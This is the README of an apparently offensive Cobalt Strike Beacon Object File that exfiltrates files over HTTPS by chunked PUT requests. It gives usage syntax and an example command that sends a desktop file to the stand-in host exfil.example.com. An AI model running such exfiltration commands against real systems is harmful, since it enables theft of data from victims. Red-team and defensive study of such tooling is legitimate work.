# Exfil BOF 
CS BOF used to exfil data over HTTPS via PUT request using wininet and chunking.  

## BOF Usage
```
Usage: Exfil --File <filepath> --Site exfil.example.com --URI /exfil/file.txt < --UserAgent CustomString > 
Exfil Example: 
   Exfil --File C:\Users\Test\Desktop\important.txt --Site exfil.example.com --URI /exfil/path/customfilename.txt --UserAgent Exfil-Test 
Exfil Options: 
    --File, path to file for exfil 
    --Site, the server to perform the PUT request to  
    --URI, the path on the server to perform the PUT request to 
    --UserAgent, Optional useragent string to add to request 
```
